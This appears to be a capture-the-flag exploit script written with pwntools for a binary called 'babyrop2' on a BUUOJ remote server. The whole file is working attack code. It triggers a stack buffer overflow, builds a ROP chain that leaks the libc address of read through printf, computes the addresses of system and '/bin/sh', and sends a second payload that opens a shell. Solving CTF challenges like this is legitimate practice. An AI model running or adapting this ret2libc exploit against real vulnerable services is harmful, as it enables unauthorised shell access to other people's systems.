from pwn import *
from LibcSearcher import *
sh = remote("node5.buuoj.cn",26929)
#sh = process("./babyrop2")
elf = ELF("./babyrop2")
libc = ELF("libc.so.6")

pop_rdi = 0x0400733
pop_rsi_r15 = 0x0400731
read = elf.got['read']
fmt = 0x0400770
print_plt = elf.plt['printf']
main_plt = elf.sym['main']

payload1 = b'a'*0x28+p64(pop_rdi)+p64(fmt)+p64(pop_rsi_r15)+p64(read)+p64(0)+p64(print_plt)+p64(main_plt)
sh.recvuntil(b"name? ")
sh.sendline(payload1)
read_addr = u64(sh.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print("read_addr="+hex(read_addr))

libc_base = read_addr - libc.sym['read']
system = libc_base + libc.sym['system']
binsh = libc_base + libc.search(b'/bin/sh').__next__()

payload2 = b'a'*0x28+p64(pop_rdi)+p64(binsh)+p64(system)+p64(1234)
sh.sendline(payload2)


sh.interactive()

